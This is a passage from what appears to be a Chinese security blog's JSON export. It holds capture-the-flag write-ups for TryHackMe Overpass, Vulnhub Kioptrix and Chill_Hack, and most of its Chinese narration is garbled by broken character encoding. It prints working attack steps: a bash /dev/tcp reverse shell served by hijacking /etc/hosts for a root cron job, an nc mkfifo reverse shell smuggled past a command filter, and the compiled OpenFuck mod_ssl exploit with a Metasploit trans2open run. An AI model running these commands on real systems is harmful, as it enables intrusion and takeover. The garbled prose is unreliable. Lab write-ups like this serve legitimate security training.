Overpass&#39; Encryption, Muirland has been complaining that it&#39;s not strong enough &gt; Write down my password somewhere on a sticky note so that I don&#39;t forget it. Wait, we make a password manager. Why don&#39;t I just use that? &gt; Test Overpass for macOS, it builds fine but I&#39;m not sure it actually works &gt; Ask Paradox how he got the automated build script working and where the builds go. They&#39;re not updating on the website è¿™æœ‰ä¸ª todo.txt æ–‡ä»¶ä½œä¸ºæç¤ºï¼Œä¸è¿‡æˆ‘è‹±è¯­ä¸å¥½ï¼Œä¹Ÿä¸ç¡®å®šè¯´çš„å•¥ï¼Œè¿˜æ˜¯å…ˆè·‘ä¸ª LinPeas çœ‹çœ‹å§ SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin 17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly ) * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªï¼Œroot ä¼šä½¿ç”¨ curl å‘ overpass.htm&#x2F;downloads&#x2F;src&#x2F;buildscrit.sh è¯·æ±‚å†…å®¹ï¼Œç„¶åä½¿ç”¨ bash æ‰§è¡Œ â•”â•â•â•â•â•â•â•â•â•â•â•£ Hostname, hosts and DNS overpass-prod 127.0.0.1 localhost 127.0.1.1 overpass-prod 127.0.0.1 overpass.thm ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters nameserver 127.0.0.53 options edns0 search eu-west-1.compute.internal ç„¶ååœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ° overpass.htm æ˜¯æŒ‡å‘çš„ 127.0.0.1 james@overpass-prod:~$ ls -la /etc/hosts -rw-rw-rw- 1 root root 250 Jun 27 2020 /etc/hosts è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ˜¯æœ‰æƒé™ä¿®æ”¹ &#x2F;etc&#x2F;hosts çš„å†…å®¹çš„ é‚£ææƒæ€è·¯å°±æœ‰äº† é¦–å…ˆåˆ›å»ºæŒ‡å®šçš„ç›®å½•å’Œè„šæœ¬ mkdir -p downloads/src &amp;&amp; vim downloads/src/buildscript.sh ç„¶åå†™å…¥æˆ‘ä»¬çš„ payload bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.18.112.117/4444 &lt;&amp;1&#39; æ¥ç€éœ€è¦ä¸¤ä¸ªçª—å£ ç¬¬ä¸€ä¸ªçª—å£ ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç¬¬äºŒä¸ªçª—å£ ä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡ python3 -m http.server 80 ç„¶åå» shell é‡Œä¿®æ”¹ &#x2F;etc&#x2F;hosts çš„å†…å®¹ 10.18.112.117 overpass.thm æŠŠç¬¬ä¸‰è¡Œæ”¹æˆè¿™æ ·ï¼Œç„¶åç­‰ç€å°±è¡Œäº† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.84.23 - - [05/May/2022 09:17:01] &quot;GET /downloads/src/buildscript.sh HTTP/1.1&quot; 200 - æˆåŠŸä¸‹è½½äº†æˆ‘ä»¬çš„ payload â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.18.112.117] from (UNKNOWN) [10.10.84.23] 43604 bash: cannot set terminal process group (16146): Inappropriate ioctl for device bash: no job control in this shell root@overpass-prod:~# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸæ‹¿åˆ°äº† root æƒé™ root@overpass-prod:~# ls ls buildStatus builds downloads go root.txt src root@overpass-prod:~# cat root.txt cat root.txt thm{7f336f8c359dbac18d54fdd64ea753bb} æˆåŠŸæ‹¿åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"TryHackMe","slug":"TryHackMe","permalink":"http://www.lucifiel.com/tags/TryHackMe/"}]},{"title":"Vulnhub - Kioptrix Level 1 é¶åœºå®æˆ˜","slug":"Kioptrix","date":"2021-11-13T00:36:20.000Z","updated":"2023-05-19T09:05:52.632Z","comments":true,"path":"2021/11/13/Kioptrix/","link":"","permalink":"http://www.lucifiel.com/2021/11/13/Kioptrix/","excerpt":"","text":"é¶åœºä¿¡æ¯This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. è¿™ä¸ªKioptrix VM Imageæ˜¯å¾ˆå®¹æ˜“çš„æŒ‘æˆ˜ã€‚æ¸¸æˆçš„ç›®çš„æ˜¯é€šè¿‡ä»»ä½•å¯èƒ½çš„æ‰‹æ®µè·å¾—rootæƒé™ï¼ˆé™¤äº†å®é™…å…¥ä¾µVMæœåŠ¡å™¨æˆ–ç©å®¶ï¼‰ã€‚è¿™äº›æ¸¸æˆçš„ç›®çš„æ˜¯å­¦ä¹ æ¼æ´è¯„ä¼°å’Œåˆ©ç”¨æ–¹é¢çš„åŸºæœ¬å·¥å…·å’ŒæŠ€æœ¯ã€‚æˆåŠŸå®Œæˆè¿™äº›æŒ‘æˆ˜çš„æ–¹æ³•æœ‰å¾ˆå¤šã€‚ ä¸‹è½½åœ°å€ https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨arpè·å–é¶æœºçš„IPåœ°å€ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.1.102 00:0c:29:55:cb:15 VMware, Inc. 9 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded ç¡®å®šé¶æœºIPåœ°å€ä¸º192.168.1.102ï¼Œä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 EST Nmap scan report for 192.168.1.102 Host is up (0.00042s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) | ssh-hostkey: | 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1) | 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA) |_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: Test Page for the Apache Web Server on Red Hat Linux 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 1024/tcp status |_ 100024 1 1024/udp status 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2009-09-26T09:32:06 |_Not valid after: 2010-09-26T09:32:06 |_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time. | sslv2: | SSLv2 supported | ciphers: | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_RC4_128_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_RC4_64_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_DES_192_EDE3_CBC_WITH_MD5 |_ SSL2_DES_64_CBC_WITH_MD5 1024/tcp open status 1 (RPC #100024) MAC Address: 00:0C:29:55:CB:15 (VMware) Device type: general purpose Running: Linux 2.4.X OS CPE: cpe:/o:linux:linux_kernel:2.4 OS details: Linux 2.4.9 - 2.4.18 (likely embedded) Network Distance: 1 hop Host script results: |_clock-skew: 1h01m54s |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE HOP RTT ADDRESS 1 0.42 ms 192.168.1.102 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.83 seconds è¿™ä¸œè¥¿ç¨å¾®çš„æœ‰ç‚¹å¤šï¼Œä¸€ä¸ªä¸ªçœ‹ 80ç«¯å£å¥½åƒä¹Ÿæ²¡å•¥å¯çœ‹çš„ï¼Ÿæ‰«ä¸ªç›®å½•çœ‹çœ‹å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.1.102/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/11/12 07:52:42 Starting gobuster in directory enumeration mode =============================================================== http://192.168.1.102/.htaccess (Status: 403) [Size: 273] http://192.168.1.102/.htpasswd (Status: 403) [Size: 273] http://192.168.1.102/.hta (Status: 403) [Size: 268] http://192.168.1.102/.htaccess.php (Status: 403) [Size: 277] http://192.168.1.102/.htpasswd.php (Status: 403) [Size: 277] http://192.168.1.102/.hta.php (Status: 403) [Size: 272] http://192.168.1.102/~root (Status: 403) [Size: 269] http://192.168.1.102/~operator (Status: 403) [Size: 273] http://192.168.1.102/cgi-bin/ (Status: 403) [Size: 272] http://192.168.1.102/index.html (Status: 200) [Size: 2890] http://192.168.1.102/manual (Status: 301) [Size: 294] [--&gt; http://127.0.0.1/manual/] http://192.168.1.102/mrtg (Status: 301) [Size: 292] [--&gt; http://127.0.0.1/mrtg/] http://192.168.1.102/usage (Status: 301) [Size: 293] [--&gt; http://127.0.0.1/usage/] http://192.168.1.102/test.php (Status: 200) [Size: 27] æŒ¨ä¸ªå»çœ‹çœ‹ å‡ ä¸ªé¡µé¢éƒ½ä¼šè·³è½¬åˆ°127.0.0.1ï¼Œåªæœ‰test.phpå¯ä»¥è®¿é—®ï¼Œè€Œä¸”è¿˜æ²¡ä»€ä¹ˆä¸œè¥¿ ç»§ç»­å›åˆ°ç«¯å£çœ‹çœ‹å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# smbclient -L 192.168.1.102 1 â¨¯ protocol negotiation failed: NT_STATUS_IO_TIMEOUT æ¼æ´åˆ©ç”¨çœ‹åˆ°80ç«¯å£åé¢çš„mod_ssl&#x2F;2.8.4ï¼Œå»æœä¸€ä¸‹æœ‰æ²¡æœ‰Exploit â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit mod_ssl ------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------ --------------------------------- Apache mod_ssl 2.0.x - Remote Denial of Service | linux/dos/24590.txt Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow | multiple/dos/21575.txt Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow | unix/remote/21671.c Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (1) | unix/remote/764.c Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (2) | unix/remote/47080.c Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &#39;openssl-too-open.c&#39; SSL2 KEY_ARG Overflow | unix/remote/40347.txt ------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results å¯¹æ¯”mod_ssl&#x2F;2.8.4ç‰ˆæœ¬ï¼Œæœ‰ä¸‰ä¸ªç‰ˆæœ¬åˆé€‚ï¼ŒæŒ¨ä¸ªè¿›è¡Œæµ‹è¯• ç»è¿‡æµ‹è¯•å‘ç°unix&#x2F;remote&#x2F;47080.cæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå’±ä»¬ç»™ä»–å¤åˆ¶å‡ºæ¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# locate unix/remote/47080.c /usr/share/exploitdb/exploits/unix/remote/47080.c â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./ ç„¶åä½¿ç”¨gccè¿›è¡Œç¼–è¯‘ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gcc -o exploit 47080.c -lcrypto 47080.c:21:10: fatal error: openssl/ssl.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• 21 | #include &lt;openssl/ssl.h&gt; | ^~~~~~~~~~~~~~~ compilation terminated. æç¤ºæŠ¥é”™äº†ï¼Œç»è¿‡ç™¾åº¦æœç´¢ï¼Œå‘ç°æ˜¯ç¼ºå°‘äº†ç»„ä»¶ å’±ä»¬ä½¿ç”¨aptè¿›è¡Œå®‰è£… â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# apt-get install libssl1.0-dev ç„¶åå†è¿›è¡Œç¼–è¯‘ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gcc -o exploit 47080.c -lcrypto â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ls 47080.c exploit å»è¿è¡Œä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./exploit ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* : Usage: ./exploit target box [port] [-c N] target - supported box eg: 0x00 box - hostname or IP address port - port for ssl connection -c open N connections. (use range 40-50 if u dont know) è¿è¡Œåå¾—åˆ°äº†è¿è¡Œå‚æ•°ï¼Œå’±ä»¬è¿˜å¾—å…ˆæ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./exploit | grep apache-1.3.20 1 â¨¯ 0x02 - Cobalt Sun 6.0 (apache-1.3.20) 0x27 - FreeBSD (apache-1.3.20) 0x28 - FreeBSD (apache-1.3.20) 0x29 - FreeBSD (apache-1.3.20+2.8.4) 0x2a - FreeBSD (apache-1.3.20_1) 0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk) 0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk) 0x3f - Mandrake Linux 8.1 (apache-1.3.20-3) 0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2 0x7e - Slackware Linux 8.0 (apache-1.3.20) 0x86 - SuSE Linux 7.3 (apache-1.3.20) ç¬¦åˆæ¡ä»¶çš„æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯0x6aå’Œ0x6bï¼Œåˆ†åˆ«å»æµ‹è¯•ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./exploit 0x6a 192.168.1.102 -c 40 ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f8070 Ready to send shellcode Spawning shell... Good Bye! 0x6aæµ‹è¯•å¤±è´¥ï¼Œç°åœ¨å»æµ‹è¯•ä¸€ä¸‹0x6b â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./exploit 0x6b 192.168.1.102 -c 40 ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f81e8 Ready to send shellcode Spawning shell... bash: no job control in this shell bash-2.05$ d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo --09:32:52-- https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c =&gt; `ptrace-kmod.c&#39; Connecting to dl.packetstormsecurity.net:443... connected! Unable to establish SSL connection. Unable to establish SSL connection. gcc: ptrace-kmod.c: No such file or directory gcc: No input files rm: cannot remove `ptrace-kmod.c&#39;: No such file or directory bash: ./exploit: No such file or directory bash-2.05$ bash-2.05$ whoami&amp;&amp;id whoami&amp;&amp;id apache uid=48(apache) gid=48(apache) groups=48(apache) 0x6bæˆåŠŸgetshellï¼Œç°åœ¨å»ææƒ æƒé™æå‡ç»è¿‡æµ‹è¯•åæ²¡æœ‰å‘ç°ææƒçš„ç‚¹ï¼Œä½†æ˜¯å‘ç°äº†å¦ä¸€ç§rootæƒé™çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯ç”¨msfçš„æ¨¡å— use exploit/linux/samba/trans2open set payload linux/x86/shell_reverse_tcp show options set rhosts 192.168.1.102 exploit msf6 exploit(linux/samba/trans2open) &gt; exploit [*] Started reverse TCP handler on 192.168.1.106:4444 [*] 192.168.1.102:139 - Trying return address 0xbffffdfc... [*] 192.168.1.102:139 - Trying return address 0xbffffcfc... [*] 192.168.1.102:139 - Trying return address 0xbffffbfc... [*] 192.168.1.102:139 - Trying return address 0xbffffafc... [*] 192.168.1.102:139 - Trying return address 0xbffff9fc... [*] 192.168.1.102:139 - Trying return address 0xbffff8fc... [*] Command shell session 1 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500 [*] Command shell session 2 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500 [*] Command shell session 3 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500 whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=99(nobody) ç”¨msfçš„æ¨¡å—æ‰“å°±æ˜¯rootï¼Œè‡³äºä¸ºå•¥æˆ‘ä¹Ÿæ²¡ç ”ç©¶å‡ºä¸ªæ‰€ä»¥ç„¶æ¥ï¼ˆä¸»è¦å› ä¸ºèœï¼‰ çŸ¥é“åŸå› çš„å°ä¼™ä¼´å¯ä»¥å‘Šè¯‰æˆ‘ä¸€ä¸‹","categories":[],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]},{"title":"Vulnhub - Chill_Hack é¶åœºå®æˆ˜","slug":"Chill_Hack","date":"2021-10-17T08:31:38.000Z","updated":"2023-05-19T09:05:04.569Z","comments":true,"path":"2021/10/17/Chill_Hack/","link":"","permalink":"http://www.lucifiel.com/2021/10/17/Chill_Hack/","excerpt":"","text":"Vulnhub-Chill_Hacké¶åœºå®æˆ˜ Vulnhub-Chill_Hack é¶åœºä¸‹è½½åœ°å€https://www.vulnhub.com/entry/chill-hack-1,622/ åºŸè¯ä¸å¤šè¯´ ç›´æ¥å¼€å§‹ ç¬¬ä¸€æ­¥ä½¿ç”¨kaliæ‰«æå†…ç½‘IP Arp-scan â€“l è·å¾—é¶åœºIPä¸º192.168.72.132 å¯¹é¶åœºè¿›è¡Œç«¯å£æ‰«æ Nmap â€“A â€“v 192.168.72.132 å‘ç°å­˜åœ¨21 22 80ä¸‰ä¸ªç«¯å£ 21ç«¯å£å­˜åœ¨åŒ¿åè®¿é—® å’±ä»¬å…ˆè®¿é—®çœ‹çœ‹ ç”¨æˆ·åä½¿ç”¨anonymous å¯†ç ä¸ºç©º æˆåŠŸç™»é™† æŸ¥çœ‹æœ‰ä»€ä¹ˆæ–‡ä»¶ å‘ç°å­˜åœ¨ä¸€ä¸ªtxtæ–‡ä»¶ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ ä½¿ç”¨getä¸‹è½½åˆ°æœ¬åœ°ç„¶åæ‰“å¼€æŸ¥çœ‹ å—¯â€¦å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆç”¨ æˆ‘ä»¬è¿˜æ˜¯å…ˆçœ‹çœ‹80ç«¯å£çš„WebæœåŠ¡å§ çœ‹ä¸Šå»åƒæ˜¯ä¸€ä¸ªä½“è‚²æ¯”èµ›çš„å®˜ç½‘ï¼Ÿ æ‰«æä¸€ä¸‹ç›®å½• å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„URL http://192.168.72.132/secret/index.php å¯ä»¥æ‰§è¡Œå‘½ä»¤ OK çªç ´å£åº”è¯¥å°±åœ¨è¿™é‡Œäº† å½“æˆ‘è¾“å…¥lsæƒ³æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç›®å½•æ–‡ä»¶çš„æ—¶å€™ è¿™æ—¶æˆ‘æƒ³èµ·æ¥æˆ‘ä»¬é‚£ä¸ªnote.txtæ–‡ä»¶é‡Œçš„è¯æ˜¯ä»€ä¹ˆæ„æ€ è¯æ˜è¿™é‡Œæœ‰è¿‡æ»¤ å°±æ˜¯ä¸çŸ¥é“æ˜¯ç™½åå•è¿˜æ˜¯é»‘åå•äº† ç»è¿‡æˆ‘å¤§é‡æµ‹è¯• è¯¥é¶åœºä¸ºé»‘åå•éªŒè¯ é‚£å°±å¥½åŠäº† ç»•è¿‡å§ å‡ºå»åƒäº†ä¸ªé¥­ å›æ¥çªç„¶æ¥äº†æ€è·¯ å°†ä¸¤ä¸ªæŒ‡ä»¤ç»“åˆèµ·æ¥ ä¸å°±æˆäº†å— ä¾‹å¦‚ lsä¼šè¢«æ‹¦æˆª é‚£å°± whoami;ls æˆåŠŸæ‰§è¡Œ æˆ‘å¯çœŸæ˜¯ä¸ªå°æœºçµ å°†è¯¥æ–¹æ³•å’ŒNCåå¼¹ä¸€ç»“åˆ ä¸å°±æ‹¿åˆ°shelläº†ï¼Ÿ ç»è¿‡å¤§é‡æµ‹è¯• å‘ç°å¯ç”¨çš„åå¼¹è¯­å¥ä¸º dir;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.72.130 7777 &gt; &#x2F;tmp&#x2F;f æœ¬æœºç›‘å¬ nc â€“lvp 7777 æ‰§è¡Œ æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshell è¯¥shellæƒé™è¿˜æ˜¯è¾ƒä½ å¹¶ä¸”æ“ä½œéå¸¸ä¸ä¾¿åˆ© å’±ä»¬è¦æƒ³åŠæ³•ææƒ æŸ¥æ‰¾pythonç‰ˆæœ¬ Which python æˆåŠŸç¡®è®¤pythonç‰ˆæœ¬ä¸ºpython3 ä½¿ç”¨python3å°†shellè¿›è¡Œæå‡ python3 -c â€˜import pty;pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™ æˆåŠŸ è¯¥å‘½ä»¤ä¸ä¼šå¯¹ç”µè„‘æœ‰ä»€ä¹ˆå±å®³ ä½†å¶å°”ä¼šæœ‰å¥‡æ•ˆ åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ è¿™ä¸ªhacker.phpå¼•èµ·äº†æˆ‘çš„æ³¨æ„ æŸ¥çœ‹ä¸€ä¸‹å§ åœ¨é»‘æš—ä¸­æˆ‘ä¼šçœ‹åˆ°ç­”æ¡ˆï¼ŸçœŸå°±äººå‡è°œè¯­äººå‘— åœ¨hacker.phpä¸­ æˆ‘ä»¬çœ‹åˆ°imagesæ–‡ä»¶å¤¹ä¸­æœ‰ä¸€å¼ å›¾ç‰‡ åº”è¯¥å°±æ˜¯çº¿ç´¢æ‰€åœ¨ å’±ä»¬è¿›å…¥imagesæ–‡ä»¶å¤¹ OK å’±ä»¬æŠŠè¿™å¼ å›¾ç‰‡ç”¨ncä¸‹è½½ä¸‹æ¥ ä¹Ÿå¯ä»¥ç”¨python3å¼€å¯httpæœåŠ¡è¿›è¡Œä¸‹è½½ ä¸è¿‡æˆ‘å›¾çœäº‹å„¿ å°±ncäº†å§ æœ¬åœ°ç”µè„‘è¿è¡Œ nc â€“nvlp 4444 &gt; hacker-with-laptop_23-2147985341.jpg å’±ä»¬ä¿æŒåŸåä¸åŠ¨ Shellé‡Œè¿è¡Œ nc 192.168.72.130 4444 -w 4 &lt; hacker-with-laptop_23-2147985341.jpg OK ç¨ç­‰ä¸€ä¼šå„¿ æˆåŠŸä¸‹è½½ä¸‹æ¥ æ ¹æ®hacker.phpä¸­çš„æç¤º åœ¨é»‘æš—ä¸­æˆ‘ä»¬ä¼šçœ‹åˆ°ç­”æ¡ˆ è¿™ä¸å°±æ˜¯å¦¥å¦¥çš„å›¾ç‰‡éšå†™å— ä¸æ„§æ˜¯æˆ‘ æœ€è¿‘çš„æŸ¯å—æ²¡ç™½çœ‹ ä½¿ç”¨steghideæŸ¥çœ‹ æœç„¶å­˜åœ¨ä¸€ä¸ªåä¸ºbackup.zipçš„å‹ç¼©åŒ… ä¸æ„§æ˜¯æˆ‘ ä¾ç„¶ä½¿ç”¨steghideè¿›è¡Œè§£å‹ OK å¾—åˆ°äº†è¿™ä¸ªåä¸ºbackup.zipçš„å‹ç¼©åŒ…æ–‡ä»¶ æˆ‘ä»¬ç°åœ¨å°†ä»–è§£å‹ç¼© æˆ‘ä¸¢å•Š è¿™é‡Œæ¥ä¸ªå¯†ç  æˆå§ å†æ‰¾ æ‰¾ï¼Ÿæ‰¾æ˜¯ä¸å¯èƒ½æ‰¾çš„ å°±å’±è¿™æš´è„¾æ°” çˆ†ä»–ï¼ ä½¿ç”¨zip2johbç”Ÿæˆäº†ä¸€ä¸ªbackup.johnæ–‡ä»¶ å’±ä»¬ä½¿ç”¨johnçˆ†ä»– OK å®Œæˆ å’±ä»¬ä½¿ç”¨johnæŸ¥çœ‹å¯†ç  å¯†ç ä¸ºpass1word è¡Œå§ ç»å…¸å¼±å£ä»¤ æ¥ä¸‹æ¥å’±ä»¬è§£å‹æ–‡ä»¶ æˆåŠŸè§£å‹å‡ºæ¥ æŸ¥çœ‹è§£å‹å‡ºæ¥çš„æ–‡ä»¶ å¥½å®¶ä¼™ è¿˜æœ‰ä¸ªbase64ç¼–ç  è§£å¯†å§ è¿”å›æˆ‘ä»¬çš„shell æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ· ä½¿ç”¨æˆ‘ä»¬å¾—åˆ°çš„å¯†ç ç™»å…¥è¿›ç”¨æˆ·anurodh æˆåŠŸç™»å…¥ ç¡®è®¤è´¦æˆ·å¯†ç æ²¡é—®é¢˜äº† è¿™æ—¶å€™å’±ä»¬å°±è¦ç”¨åˆ°ä¸€å¼€å§‹æ‰«æå‡ºçš„22ç«¯å£äº† æ¯•ç«Ÿshellæ˜¯ä¸ç¨³å®šçš„ ä½¿ç”¨sshæœåŠ¡ç™»å…¥å§ æˆåŠŸç™»å…¥ æœ‰ä¸€ä¸ªç¨³å®šçš„æƒé™çš„æ„Ÿè§‰å¤ªçˆ½äº† è¿™æ—¶å€™è‚¯å®šå°±æ˜¯ææƒäº†æ˜¯å§ ç›´æ¥ä½¿ç”¨ç»å…¸çš„sudo su å¤±è´¥äº† å—¯â€¦ 